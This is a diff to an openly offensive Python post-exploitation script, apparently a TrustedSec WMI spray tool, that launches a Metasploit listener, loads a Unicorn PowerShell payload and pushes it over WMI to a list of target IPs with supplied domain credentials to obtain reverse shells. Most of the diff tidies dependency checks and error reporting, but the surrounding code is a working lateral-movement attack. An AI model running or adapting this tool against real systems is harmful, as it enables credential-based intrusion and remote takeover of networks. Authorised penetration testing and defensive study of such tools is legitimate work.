@@ -14,7 +14,7 @@
 #
 # Initial blog post: https://www.trustedsec.com/june-2015/no_psexec_needed/
 # If you have trouble with this on 64-bit, try:
-# dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386
+# dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 libpopt0:i386
 #
 # Be sure to configure the three options below for Unicorn and WMI paths. This is mandatory or will not work.
 # Make sure to close meterpreter properly (exit or kill session) or else the server may spike high CPU - weirdness with PowerShell.
@@ -27,6 +27,15 @@ import time
 definepath = os.getcwd()
 os.system('clear')
 
+try: import pexpect
+except ImportError:
+        print ("[!] python-pexpect not installed, attempting to install it.")
+        subprocess.Popen("python -m pip install pexpect", shell=True).wait()
+        try: import pexpect
+        except ImportError:
+                print ("[!] Sorry, could not install pexpect. Try installing it manually: python-pexpect\n\n")
+                sys.exit()
+
 unicorn = ("/pentest/post-exploitation/unicorn/")
 if not os.path.isdir("/pentest/post-exploitation/unicorn/"):
 	if not os.path.isdir(definepath + "/unicorn/"):
@@ -38,18 +47,14 @@ if not os.path.isdir("/pentest/post-exploitation/unicorn/"):
 wmi = ("./wmis")
 if os.path.isfile("wmis"):
 	subprocess.Popen("chmod +x wmis", shell=True).wait()
-
-# Flag to turn verbosity on.
-verbose = "off"
-
-try: import pexpect
-except ImportError:
-	print ("[!] python-pexpect not installed, attempting to install it.")
-	subprocess.Popen("python -m pip install pexpect", shell=True).wait()
-	try: import pexpect
-	except ImportError:
-		print ("[!] Sorry, could not install pexpect. Try installing it manually: python-pexpect\n\n")
+	proc = subprocess.Popen("./wmis", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+	if "error while loading shared" in proc.communicate()[1]:
+		print ("[!] Looks like you have an issue with wmis - this is most likely because you are on a 64 bit platform and need a couple things first..")
+		print ("[!] If on Ubuntu run command to fix: dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 libpopt0:i386")
 		sys.exit()
+
+if not os.path.isfile("wmis"):
+	print ("[!] WMIS not detected - edit this script to add the full path to WMIS or this will not work.")
 
 # Main variable assignment from command line parameters.
 optional = ""
@@ -110,7 +115,7 @@ if os.path.isfile(unicorn + "/unicorn.py"):
 		child = pexpect.spawn("msfconsole -r %s/unicorn.rc" % (unicorn))
 	        print ("[*] Waiting for the listener to start first before we continue.")
 	        print ("[*] Be patient, Metasploit takes a little bit to start.")
-	        child.expect("Starting the payload handler.", timeout=30000)
+	        child.expect("Exploit running", timeout=30000)
 	unicorn_code = file(unicorn + "/powershell_attack.txt", "r").read()
 	# All back to normal.
 	os.chdir(definepath)
@@ -145,7 +150,6 @@ if os.path.isfile(cidr):
 
 counter = 0
 for line in fileopen:
-	print line
 	counter = 1
 
 if counter == 1:
@@ -153,10 +157,11 @@ if counter == 1:
 		ip = ip.rstrip()
 		command = ('''%s -U %s/%s%%%s //%s "%s"''' % (wmi,domain,user,password,ip,unicorn_code))
 		print ("[*] Launching WMI spray against IP: %s - You should have a shell in the background. Once finished, a shell will spawn." % (ip))
-		if verbose == "off":
-			subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		if verbose == "on":
-			subprocess.Popen(command)
+		proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		stdout_value = proc.communicate()[1]
+		if not "Success" in stdout_value: 
+			print ("[!] !!!!! WARNING !!!!! - We got something not good from the server.")
+			print ("[!] ERROR: Something happened, printing server (%s) response: " % (ip) + stdout_value)
 
 	# Cleanup
 	if os.path.isfile("openwmi.txt"):
